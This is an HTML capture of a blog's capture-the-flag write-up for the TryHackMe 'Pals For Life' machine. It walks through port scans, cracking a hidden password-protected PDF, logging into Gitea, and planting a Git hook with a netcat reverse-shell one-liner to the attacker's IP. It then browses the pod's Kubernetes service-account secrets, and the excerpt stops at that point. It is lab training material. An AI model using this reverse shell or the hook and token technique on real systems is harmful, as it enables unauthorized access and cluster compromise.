<!doctype html><html lang=en>
<head>
<title>
Pals For Life - Write Up ::
Lanfran02 - Blog — Where write-ups are made.
</title><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Link Level Creator     Here Medium ttauveron    Reconn Aloha! Welcome to a new write up!
For this reconn phase, let&amp;rsquo;s use nmap to scan the services of the machine!
╰─ lanfran@parrot ❯ sudo nmap 10.10.24.160 -p- -sS --min-rate 5000 -n -Pn ─╯ Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.">
<meta name=keywords content="CTF,Writeup,Hacking">
<meta name=robots content="noodp">
<link rel=canonical href=/posts/palsforlife/>
<link rel=stylesheet href=/assets/style.css>
<link rel=stylesheet href=/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=/img/favicon.png>
<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="/posts/palsforlife/cover.jpeg">
<meta name=twitter:title content="Pals For Life - Write Up">
<meta name=twitter:description content="TryHackMe's medium level machine.">
<meta property="og:title" content="Pals For Life - Write Up">
<meta property="og:description" content="TryHackMe's medium level machine.">
<meta property="og:type" content="article">
<meta property="og:url" content="/posts/palsforlife/"><meta property="og:image" content="/posts/palsforlife/cover.jpeg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-10-26T19:36:09+02:00">
<meta property="article:modified_time" content="2021-10-26T19:36:09+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","G-3T7DYCWC0W","auto"),ga("send","pageview"))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
</head><body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about>About</a></li><li><a href=/es/>Español</a></li><ul class=menu__sub-inner>
<li class=menu__sub-inner-more-trigger>
Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
</li><ul class="menu__sub-inner-more hidden">
<li><a href=/tags/hackthebox/>HTB</a></li><li><a href=/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile">
<li><a href=/about>About</a></li><li><a href=/es/>Español</a></li><li><a href=/tags/hackthebox/>HTB</a></li><li><a href=/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header><div class=content>
<div class=post>
<h1 class=post-title>Pals For Life - Write Up</h1><div class=post-meta>
<span class=post-date>
2021-10-26
</span>
<span class=post-author>— Written by Lanfran02</span>
<span class=post-read-time>— 8 min read</span>
</div><span class=post-tags>
<a href=/tags/john/>#john</a>&nbsp;
<a href=/tags/gitea/>#gitea</a>&nbsp;
<a href=/tags/kubectl/>#kubectl</a>&nbsp;
<a href=/tags/kubernetes/>#kubernetes</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
</span>
<figure class=post-cover>
<img src=/posts/palsforlife/cover.jpeg alt="Pals For Life - Write Up">
</figure><div class=post-content>
<h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li><a href=#reconn>Reconn</a></li><li><a href=#flag-1>Flag 1</a></li><li><a href=#flag-2>Flag 2</a></li><li><a href=#flag-3>Flag 3</a></li><li><a href=#root--flag-4>Root / Flag 4</a></li></ul></nav></aside><table>
<thead>
<tr>
<th>Link</th><th>Level</th><th>Creator</th></tr></thead><tbody>
<tr>
<td><a href=https://tryhackme.com/room/palsforlife>Here</a></td><td>Medium</td><td><a href=https://tryhackme.com/p/ttauveron>ttauveron</a></td></tr></tbody></table><h2 id=reconn>Reconn</h2><p>Aloha! Welcome to a new write up!</p><p>For this reconn phase, let&rsquo;s use <code>nmap</code> to scan the services of the machine!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ sudo nmap 10.10.24.160 -p- -sS --min-rate <span style=color:#ae81ff>5000</span> -n -Pn                                                          ─╯
</span></span><span style=display:flex><span>Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times will be slower.
</span></span><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-10-26 19:23 CEST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.24.160
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.076s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65529</span> closed ports
</span></span><span style=display:flex><span>PORT      STATE    SERVICE
</span></span><span style=display:flex><span>22/tcp    open     ssh
</span></span><span style=display:flex><span>6443/tcp  open     sun-sr-https
</span></span><span style=display:flex><span>10250/tcp open     unknown
</span></span><span style=display:flex><span>30180/tcp filtered unknown
</span></span><span style=display:flex><span>31111/tcp open     unknown
</span></span><span style=display:flex><span>31112/tcp open     unknown
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 24.34 seconds
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>╰─ lanfran@parrot ❯ sudo nmap 10.10.24.160 -p 22,6443,10250,30180,31111,31112 -sV --min-rate <span style=color:#ae81ff>5000</span> -n -Pn                            ─╯
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
</span></span><span style=display:flex><span>Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times will be slower.
</span></span><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-10-26 20:56 CEST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.24.160
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.060s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE           VERSION
</span></span><span style=display:flex><span>22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>6443/tcp  open  ssl/sun-sr-https?
</span></span><span style=display:flex><span>10250/tcp open  ssl/http          Golang net/http server <span style=color:#f92672>(</span>Go-IPFS json-rpc or InfluxDB API<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>30180/tcp open  http              nginx 1.21.0
</span></span><span style=display:flex><span>31111/tcp open  unknown
</span></span><span style=display:flex><span>31112/tcp open  ssh               OpenSSH 7.5 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 101.35 seconds
</span></span></code></pre></div><p>After running both scans against the machine, we have something like this:</p><table>
<thead>
<tr>
<th>Port</th><th>Service</th></tr></thead><tbody>
<tr>
<td>22</td><td>SSH</td></tr><tr>
<td>6443</td><td>Kubernetes API server</td></tr><tr>
<td>10250</td><td>Kubelet API</td></tr><tr>
<td>30180</td><td>Nginx</td></tr><tr>
<td>31111</td><td>Gitea(Pod)*</td></tr><tr>
<td>31112</td><td>SSH(Pod)*</td></tr></tbody></table><p><em>(*) I determined that this ports are from pods because of the default pods&rsquo;s port range: 30000-32767. Reference <a href=https://kubernetes.io/docs/reference/ports-and-protocols/>here</a>.</em></p><p>So let&rsquo;s now enumerate our interesting service of the port <code>30180</code> the <code>Nginx</code> server, that just showed us a 401 page.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ scan http://10.10.24.160:30180/                                                                                 ─╯
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.0.1
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@_FireFart_<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:            http://10.10.24.160:30180/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:        <span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:       /usr/share/wordlists/dirb/common.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Status codes:   200,204,301,302,307,401,403
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:     gobuster/3.0.1
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:        10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2021/10/26 20:55:04 Starting gobuster
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>/team <span style=color:#f92672>(</span>Status: 301<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2021/10/26 20:55:10 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><p>Great! A new endpoint!</p><p>Let&rsquo;s see what&rsquo;s on it!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ curl 10.10.24.160:30180/team/                                                                                                                   ─╯
</span></span><span style=display:flex><span>&lt;!DOCTYPE HTML&gt;
</span></span><span style=display:flex><span>&lt;html lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;head&gt;
</span></span><span style=display:flex><span>&lt;META charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;META name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span>
</span></span><span style=display:flex><span> content<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;title&gt;&lt;/title&gt;
</span></span><span style=display:flex><span>&lt;style&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>&lt;body&gt;
</span></span><span style=display:flex><span>    &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;center&#39;</span>&gt;
</span></span><span style=display:flex><span>      &lt;p class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;awesome&#34;</span>&gt;Alright chums, you can now push your stuff in! &lt;br /&gt;
</span></span><span style=display:flex><span>      My pals are waiting <span style=color:#66d9ef>for</span> me on Wow, we gotta <span style=color:#66d9ef>do</span> serious business, I see you tomorrow.&lt;br /&gt;
</span></span><span style=display:flex><span>      Times up, let<span style=color:#e6db74>&#39;s do this! &lt;br /&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/ufeEAxz1AH8&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&#34; allowfullscreen&gt;&lt;/iframe&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;/p&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;!-- I shouldn&#39;</span>t forget this --&gt;
</span></span><span style=display:flex><span>      &lt;div id<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;uninteresting_file.pdf&#34;</span> style<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;visibility: hidden; display: none;&#34;</span>&gt;JVBERi0xLjcKJb/3ov4KMSAwIG9iago8PCAvRGVzdHMgMyAwIFIgL0V4dGVuc2lvbnMgPDwgL0FE
</span></span><span style=display:flex><span>QkUgPDwgL0Jhc2VWZXJzaW9uIC8xLjcgL0V4dGVuc2lvbkxldmVsIDggPj4gPj4gL1BhZ2VzIDQg
</span></span><span style=display:flex><span>MCBSIC9UeXBlIC9DYXRhbG9nID4+CmVuZG9iagoyIDAgb2JqCjw8IC9DcmVhdGlvbkRhdGUgPDEw
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>YWQwMGE5NjgxZWU3YWVkZWYxYTc4ZjQwMmQ2NTYxPjw4OGFkMDBhOTY4MWVlN2FlZGVmMWE3OGY0
</span></span><span style=display:flex><span>MDJkNjU2MT5dIC9FbmNyeXB0IDEzIDAgUiA+PgpzdGFydHhyZWYKODY2NAolJUVPRgo<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>&lt;/div&gt;
</span></span><span style=display:flex><span>    &lt;/div&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;/body&gt;
</span></span></code></pre></div><h2 id=flag-1>Flag 1</h2><p>Mmm an strange <code>base64</code> hidden in one div with the name <code>uninteresting_file.pdf</code>. Let&rsquo;s copy it and decode this <code>base64</code>!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ cat encode.txt | base64 --decode &gt; uninteresting_file.pdf                                                                                       ─╯
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>╰─ lanfran@parrot ❯ ls -la                                                                                                                                          ─╯
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>32</span>
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> lanfran lanfran    <span style=color:#ae81ff>86</span> Oct <span style=color:#ae81ff>26</span> 19:48 .
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>1</span> lanfran lanfran   <span style=color:#ae81ff>468</span> Oct <span style=color:#ae81ff>26</span> 19:36 ..
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> lanfran lanfran <span style=color:#ae81ff>12311</span> Oct <span style=color:#ae81ff>26</span> 19:47 encode.txt
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> lanfran lanfran  <span style=color:#ae81ff>9113</span> Oct <span style=color:#ae81ff>26</span> 19:48 uninteresting_file.pdf
</span></span></code></pre></div><p>Wow! It&rsquo;s actually a real <code>pdf</code> but it&rsquo;s secured with a password, let&rsquo;s use <code>john</code> to crack it!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ perl /usr/share/john/pdf2john.pl uninteresting_file.pdf &gt; pdf.hash                                                                              ─╯
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>╰─ lanfran@parrot ❯ john pdf.hash --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt                                                                                       ─╯
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>PDF <span style=color:#f92672>[</span>MD5 SHA2 RC4/AES 32/64<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>revision<span style=color:#f92672>)</span> is <span style=color:#ae81ff>6</span> <span style=color:#66d9ef>for</span> all loaded hashes
</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>4</span> OpenMP threads
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>      <span style=color:#f92672>(</span>uninteresting_file.pdf<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1g 0:00:02:32 DONE <span style=color:#f92672>(</span>2021-10-26 19:51<span style=color:#f92672>)</span> 0.006544g/s 397.0p/s 397.0c/s 397.0C/s crazyk..bobby23
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show --format=PDF&#34;</span> options to display all of the cracked passwords reliably
</span></span><span style=display:flex><span>Session completed
</span></span></code></pre></div><p>Great! And when we use this password to open the pdf we found something similar to a password! Let&rsquo;s save it for later.</p><p>So, let&rsquo;s continue with our enumeration, let&rsquo;s see what the <code>gitea</code> server is hidding!</p><p>After registering a dummy account, we found a new user: <code>leeroy</code>!</p><p>So maybe the password that we found in the pdf is for this user? Let&rsquo;s try!</p><p><img src=loged.png alt=loged></p><p>Yes! We now can see the repositories of this user!</p><p>If you go to the webhook&rsquo;s settings of the repository &ldquo;jenkins&rdquo;, you can see a webhook, that the <code>secret</code> is actually our second flag!</p><p><img src=web.png alt=web></p><h2 id=flag-2>Flag 2</h2><p>Since this user can add <code>Git Hooks</code> to the repositories, I created a new one and used an exploit similar to this one, for an old THM machine, named <a href=https://lanfran02.github.io/posts/gitandcrumpets/>Git And Crumpets</a>.</p><p>Here is the exploit that we used:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.9.6.53 <span style=color:#ae81ff>1337</span> &gt;/tmp/f
</span></span></code></pre></div><p><img src=expl.png alt=expl></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>Terminal 1<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>╰─ lanfran@parrot ❯ touch crackme.md <span style=color:#f92672>&amp;&amp;</span> git init <span style=color:#f92672>&amp;&amp;</span> git add crackme.md <span style=color:#f92672>&amp;&amp;</span> git commit -m <span style=color:#e6db74>&#34;Exploiting&#34;</span> <span style=color:#f92672>&amp;&amp;</span> git remote add origin http://10.10.24.160:31111/leeroy/vuln.git <span style=color:#f92672>&amp;&amp;</span> git push -u origin master
</span></span><span style=display:flex><span>hint: Using <span style=color:#e6db74>&#39;master&#39;</span> as the name <span style=color:#66d9ef>for</span> the initial branch. This default branch name
</span></span><span style=display:flex><span>hint: is subject to change. To configure the initial branch name to use in all
</span></span><span style=display:flex><span>hint: of your new repositories, which will suppress this warning, call:
</span></span><span style=display:flex><span>hint: 
</span></span><span style=display:flex><span>hint: 	git config --global init.defaultBranch &lt;name&gt;
</span></span><span style=display:flex><span>hint: 
</span></span><span style=display:flex><span>hint: Names commonly chosen instead of <span style=color:#e6db74>&#39;master&#39;</span> are <span style=color:#e6db74>&#39;main&#39;</span>, <span style=color:#e6db74>&#39;trunk&#39;</span> and
</span></span><span style=display:flex><span>hint: <span style=color:#e6db74>&#39;development&#39;</span>. The just-created branch can be renamed via this command:
</span></span><span style=display:flex><span>hint: 
</span></span><span style=display:flex><span>hint: 	git branch -m &lt;name&gt;
</span></span><span style=display:flex><span>Initialized empty Git repository in /<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>/exploiting_git/.git/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>master <span style=color:#f92672>(</span>root-commit<span style=color:#f92672>)</span> b8dd8d4<span style=color:#f92672>]</span> Exploiting
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1</span> file changed, <span style=color:#ae81ff>0</span> insertions<span style=color:#f92672>(</span>+<span style=color:#f92672>)</span>, <span style=color:#ae81ff>0</span> deletions<span style=color:#f92672>(</span>-<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> create mode <span style=color:#ae81ff>100644</span> crackme.md
</span></span><span style=display:flex><span>Username <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;http://10.10.24.160:31111&#39;</span>: leeroy
</span></span><span style=display:flex><span>Password <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;http://leeroy@10.10.24.160:31111&#39;</span>: 
</span></span><span style=display:flex><span>Enumerating objects: 3, <span style=color:#66d9ef>done</span>.
</span></span><span style=display:flex><span>Counting objects: 100% <span style=color:#f92672>(</span>3/3<span style=color:#f92672>)</span>, <span style=color:#66d9ef>done</span>.
</span></span><span style=display:flex><span>Writing objects: 100% <span style=color:#f92672>(</span>3/3<span style=color:#f92672>)</span>, <span style=color:#ae81ff>214</span> bytes | 214.00 KiB/s, <span style=color:#66d9ef>done</span>.
</span></span><span style=display:flex><span>Total <span style=color:#ae81ff>3</span> <span style=color:#f92672>(</span>delta 0<span style=color:#f92672>)</span>, reused <span style=color:#ae81ff>0</span> <span style=color:#f92672>(</span>delta 0<span style=color:#f92672>)</span>, pack-reused <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>----------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Terminal 2<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.9.6.53<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.24.160<span style=color:#f92672>]</span> <span style=color:#ae81ff>37783</span>
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>15<span style=color:#f92672>)</span>: Not a tty
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>bash-4.4$ id
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>git<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>git<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>git<span style=color:#f92672>)</span>,1000<span style=color:#f92672>(</span>git<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>bash-4.4$ pwd
</span></span><span style=display:flex><span>pwd
</span></span><span style=display:flex><span>/data/git/repositories/leeroy/vuln.git
</span></span><span style=display:flex><span>bash-4.4$ cd /root
</span></span><span style=display:flex><span>bash-4.4$ ls -la
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>12</span>
</span></span><span style=display:flex><span>drwxrwxrwx    <span style=color:#ae81ff>3</span> root     root          <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>31</span> 22:01 .
</span></span><span style=display:flex><span>drwxr-xr-x    <span style=color:#ae81ff>1</span> root     root          <span style=color:#ae81ff>4096</span> Oct <span style=color:#ae81ff>26</span> 17:25 ..
</span></span><span style=display:flex><span>drwxr-xr-x    <span style=color:#ae81ff>2</span> root     root          <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>31</span> 22:01 ..2021_05_31_22_01_32.228018415
</span></span><span style=display:flex><span>lrwxrwxrwx    <span style=color:#ae81ff>1</span> root     root            <span style=color:#ae81ff>31</span> May <span style=color:#ae81ff>31</span> 22:01 ..data -&gt; ..2021_05_31_22_01_32.228018415
</span></span><span style=display:flex><span>lrwxrwxrwx    <span style=color:#ae81ff>1</span> root     root            <span style=color:#ae81ff>16</span> May <span style=color:#ae81ff>31</span> 22:01 flag2.txt -&gt; ..data/flag2.txt
</span></span><span style=display:flex><span>bash-4.4$ cat flag2.txt 
</span></span><span style=display:flex><span>flag<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
</span></span></code></pre></div><p>After submiting the second flag, I used the hint of the flag 3. &ldquo;<code>kubectl</code>&rdquo;.</p><p>So maybe we have some secrets/tokens to use with <code>kubectl</code> and we can get them from this pod!</p><p>And Yes! We have a token stored! Let&rsquo;s save it in our local machine!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>bash-4.4$ ls -la /var/run/secrets/kubernetes.io
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span>drwxr-xr-x    <span style=color:#ae81ff>3</span> root     root          <span style=color:#ae81ff>4096</span> Oct <span style=color:#ae81ff>26</span> 17:25 .
</span></span><span style=display:flex><span>drwxr-xr-x    <span style=color:#ae81ff>3</span> root     root          <span style=color:#ae81ff>4096</span> Oct <span style=color:#ae81ff>26</span> 17:25 ..
</span></span><span style=display:flex><span>drwxrwxrwt    <span style=color:#ae81ff>3</span> root     root           <span style=color:#ae81ff>140</span> Oct <span style=color:#ae81ff>26</span> 17:25 serviceaccount
</span></span><span style=display:flex><span>bash-4.4$ cd /var/run/secrets/kubernetes.io/serviceaccount
</span></span><span style=display:flex><span>bash-4.4$ ls -la
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>drwxrwxrwt    <span style=color:#ae81ff>3</span> root     root           <span style=color:#ae81ff>140</span> Oct <span style=color:#ae81ff>26</span> 17:25 .
</span></span><span style=display:flex><span>drwxr-xr-x    <span style=color:#ae81ff>3</span> root     root          <span style=color:#ae81ff>4096</span> Oct <span style=color:#ae81ff>26</span> 17:25 ..
</span></span><span style=display:flex><span>drwxr-xr-x    <span style=color:#ae81ff>2</span> root     root           <span style=color:#ae81ff>100</span> Oct <span style=color:#ae81ff>26</span> 17:25 ..2021_10_26_17_25_23.066083395
</span></span><span style=display:flex><span>lrwxrwxrwx    <span style=color:#ae81ff>1</span> root     root            <span style=color:#ae81ff>31</span> Oct <span style=color:#ae81ff>26</span> 17:25 ..data -&gt; ..2021_10_26_17_25_23.066083395
